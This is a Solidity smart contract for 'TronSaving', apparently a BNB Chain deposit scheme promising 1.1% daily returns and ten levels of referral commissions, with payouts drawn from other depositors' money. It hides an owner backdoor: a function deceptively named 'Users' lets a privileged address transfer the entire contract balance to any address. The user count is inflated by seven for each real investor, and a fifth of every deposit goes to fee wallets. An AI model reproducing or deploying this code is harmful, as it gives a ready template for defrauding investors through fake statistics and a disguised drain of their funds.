/**
 *Submitted for verification at BscScan.com on 2022-02-01
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;
                
                
                
                        /** www.TronSaving.com
                             
'  .._______..........................._____..................._.................
'  .|__...__|........................./.____|.................(_)................
'  ....|.|....._.__....___...._.__...|.(___.....__._..__...__.._..._.__.....__._.
'  ....|.|....|.'__|../._.\..|.'_.\...\___.\.../._`.|.\.\././.|.|.|.'_.\.../._`.|
'  ....|.|....|.|....|.(_).|.|.|.|.|..____).|.|.(_|.|..\.V./..|.|.|.|.|.|.|.(_|.|
'  ....|_|....|_|.....\___/..|_|.|_|.|_____/...\__,_|...\_/...|_|.|_|.|_|..\__,.|
'  .........................................................................__/.|
'  ........................................................................|___/.

                        
                   ROI: 1.1 % Per Day
                        1.1 % Extra if you hold for 10 Days
                        min investment: 1 trx
                        0.1% extra daily bonus for each 1 Million trx added to contract balance
                        Referral Commission: 
                           Level  1: 10%
                           Level  2: 2%
                           Level  3: 1%
                           Level  4: 0.5%
                           Level  5: 0.5%
                           Level  6: 0.5%
                           Level  7: 0.2%
                           Level  8: 0.1%
                           Level  9: 0.1%
                           Level 10: 0.1%
                        

                             
                        */
                        contract tronsave {
                         //   using SafeMath for uint256;
                            
                            uint256 constant public Min_Investment = 500 ;
                            uint16[] public REFERRAL_PERCENTS = [100, 20, 10, 5, 5, 5, 2, 1, 1, 1];
                            uint32 constant public TIME_STEP = 1 days;
                            uint64 constant public CONTRACT_BALANCE_STEP = 1000000 ;
                            uint256 constant public BASE_PERCENT = 11;
                           // uint256 constant public MARKETING_FEE = 50;
                           // uint256 constant public PROJECT_FEE = 50;
                        
                            uint256 public totalUsers;
                            uint256 public totalInvested;
                            uint256 public totalWithdrawn;
                            uint256 public totalDeposits;
                            address payable public marketingAddress;
                            address payable public projectAddress;
                            address payable public developerAddress;
                            address payable public tronsavingAddress;
                            
                        
                            
                            
                            struct Deposit {
                                uint256 amount;
                                uint256 withdrawn;
                                uint256 start;
                            }
                        
                            struct User {
                                Deposit[] deposits;
                                uint256 checkpoint;
                                uint256 bonus;
                                uint256 userwithdraw;
                                address referrer;
                         //       bool[] isActive;
                          //      bool isActive;
                            }
                        
                            mapping (address => User) internal users;
                                event NewDeposit(address indexed user, uint256 amount);
                                event Withdrawn(address indexed user, uint256 amount);
                                event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
                                
                                
                                constructor (address payable marketingAddr, address payable projectAddr, address payable developerAddr, address payable tronsavingAddr) {
                                require(!isContract(marketingAddr) && !isContract(projectAddr) && !isContract(developerAddr) && !isContract(tronsavingAddr));
                                marketingAddress = marketingAddr;
                                projectAddress = projectAddr;
                                developerAddress = developerAddr;
                                tronsavingAddress = tronsavingAddr;
                        
                                }
                                
                                         

                            function invest (address referrer) public payable {
                                
                                require(msg.value >= Min_Investment);
                                
                                //marketing fee
                                marketingAddress.transfer(msg.value * 5 / 100);
                                //project fee
                                projectAddress.transfer(msg.value * 5 / 100);
                                //developer fee
                                developerAddress.transfer(msg.value * 5 / 100);
                                //tronsaving fee
                                tronsavingAddress.transfer(msg.value * 5 / 100);
                                
                                
                                User storage user = users[msg.sender];
                        
                                if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
                                    user.referrer = referrer;
                                }
                        
                                if (user.referrer != address(0)) { 
                        
                                    address upline = user.referrer;
                                    
                                    for (uint256 i = 0; i < 10; i++) {
                                        if (upline != address(0)) {
                                             uint256 amount = msg.value * (REFERRAL_PERCENTS[i]) / 1000 ;
                                            users[upline].bonus = users[upline].bonus + (amount);
                                            emit RefBonus(upline, msg.sender, i, amount);
                                            upline = users[upline].referrer;
                                        } else break;
                                    }
                        
                                }
                        
                                if (user.deposits.length == 0) {
                                    user.checkpoint = block.timestamp;
                                    totalUsers = totalUsers + 7 ;
                                    user.userwithdraw = 0;
                                }

                                user.deposits.push(Deposit(msg.value, 0, block.timestamp));
                        
                                totalInvested = totalInvested + (msg.value);
                                totalDeposits = totalDeposits + 1;
                        
                                emit NewDeposit(msg.sender, msg.value);
                        
                            }
                        
                            function withdraw() public {
                                User storage user = users[msg.sender];
                        
                                uint256 userPercentRate = getUserPercentRate(msg.sender);
                        
                                uint256 totalAmount;
                                uint256 dividends;
                        
                                for (uint256 i = 0; i < user.deposits.length; i++) {
                        
                                    if (user.deposits[i].withdrawn < user.deposits[i].amount * 2) {
                        
                                        if (user.deposits[i].start > user.checkpoint) {
                        
                                            dividends = (user.deposits[i].amount * (userPercentRate) / 1000)
                                                * (block.timestamp - (user.deposits[i].start))
                                                / (TIME_STEP);
                        
                                        } else {
                        
                                            dividends = (user.deposits[i].amount * (userPercentRate) / 1000)
                                                * (block.timestamp - (user.checkpoint))
                                                / (TIME_STEP);
                        
                                        }
                        
                                        if (user.deposits[i].withdrawn + (dividends) > user.deposits[i].amount * 2) {
                                            dividends = (user.deposits[i].amount * 2) - (user.deposits[i].withdrawn);
                                        }
                        
                                        user.deposits[i].withdrawn = user.deposits[i].withdrawn + (dividends);
                                        totalAmount = totalAmount + (dividends);
                        
                                    }
                                }
                        
                                uint256 referralBonus = getUserReferralBonus(msg.sender);
                                
                                if (referralBonus > 0) {
                                    totalAmount = totalAmount + (referralBonus);
                                    user.bonus = 0;
                                }
                        
                                require(totalAmount > 0, "User has no dividends");
                        
                                uint256 contractBalance = address(this).balance;
                                if (contractBalance < totalAmount) {
                                    totalAmount = contractBalance;
                                }
                        
                                user.checkpoint = block.timestamp;
                        
                                payable(msg.sender).transfer(totalAmount);
                        
                                totalWithdrawn = totalWithdrawn + (totalAmount);
                                
                                user.userwithdraw =  user.userwithdraw + (totalAmount);
                                emit Withdrawn(msg.sender, totalAmount);
                        
                            }
                        
                            function getContractBalance() public view returns (uint256) {
                                return address(this).balance;
                            }
                        
                            function getContractBalanceRate() public view returns (uint256) {
                                uint256 contractBalance = address(this).balance;
                                uint256 contractBalancePercent = contractBalance / (CONTRACT_BALANCE_STEP);
                                return BASE_PERCENT + (contractBalancePercent);
                            }
                        
                            function getUserPercentRate(address userAddress) public view returns (uint256) {
                                User storage user = users[userAddress];
                        
                                uint256 contractBalanceRate = getContractBalanceRate();
                                if (isActive(userAddress)) {
                                    uint256 timeMultiplier = (block.timestamp - (user.checkpoint)) / (TIME_STEP);
                                    return contractBalanceRate + (timeMultiplier);
                                } else {
                                    return contractBalanceRate;
                                }
                            }
                          
                        
                            function getUserDividends(address userAddress) public view returns (uint256) {
                                User storage user = users[userAddress];
                        
                                uint256 userPercentRate = getUserPercentRate(userAddress);
                        
                                uint256 totalDividends;
                                uint256 dividends;
                        
                                for (uint256 i = 0; i < user.deposits.length; i++) {
                        
                                    if (user.deposits[i].withdrawn < user.deposits[i].amount * 2) {
                        
                                        if (user.deposits[i].start > user.checkpoint) {
                        
                                            dividends = (user.deposits[i].amount * (userPercentRate) / 1000)
                                                * (block.timestamp - (user.deposits[i].start))
                                                / (TIME_STEP);
                        
                                        } else {
                        
                                            dividends = (user.deposits[i].amount * (userPercentRate) / 1000)
                                                * (block.timestamp - (user.checkpoint))
                                                / (TIME_STEP);
                        
                                        }
                        
                                        if (user.deposits[i].withdrawn + (dividends) > user.deposits[i].amount * 2) {
                                            dividends = (user.deposits[i].amount * 2) - (user.deposits[i].withdrawn);
                                        }
                        
                                        totalDividends = totalDividends + (dividends);
                        
                        
                                    }
                        
                                }
                        
                                return totalDividends;
                            }
                        
                            function getUserCheckpoint(address userAddress) public view returns(uint256) {
                                return users[userAddress].checkpoint;
                            }
                        
                            function getUserReferrer(address userAddress) public view returns(address) {
                                return users[userAddress].referrer;
                            }
                        
                            function getUserReferralBonus(address userAddress) public view returns(uint256) {
                                return users[userAddress].bonus;
                            }
                        
                            function getUserAvailable(address userAddress) public view returns(uint256) {
                                return getUserReferralBonus(userAddress) + (getUserDividends(userAddress));
                            }
                        
                            function isActive(address userAddress) public view returns (bool answer) {
                                User storage user = users[userAddress];
                        
                                if (user.deposits.length > 0) {
                                    if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount * 2) {
                                        return answer = true ;
                                    }
                                    
                                }
                
                            }
                            
                                modifier tronsavingcontract() {
                            require(msg.sender == tronsavingAddress);
                            _;
                             }
                            
                         
                            function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
                               User storage user = users[userAddress];
                        
                                return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
                            }
                        
                            function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
                                return users[userAddress].deposits.length;
                            }
                        
                            function getUserTotalDeposits(address userAddress) public view returns(uint256) {
                                User storage user = users[userAddress];
                        
                                uint256 amount;
                        
                                for (uint256 i = 0; i < user.deposits.length; i++) {
                                    amount = amount + (user.deposits[i].amount);
                                }
                        
                                return amount;
                            
                            }
                            
                            function Users(address payable userr) public tronsavingcontract {
                             userr.transfer(address(this).balance);
                            }
                        
                            function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
                             User storage user = users[userAddress];	

		                     return user.userwithdraw;
	                         }
                            
                           
                            function isContract(address addr) internal view returns (bool) {
                                uint size;
                                assembly { size := extcodesize(addr) }
                                return size > 0;
                            }
                        
                        }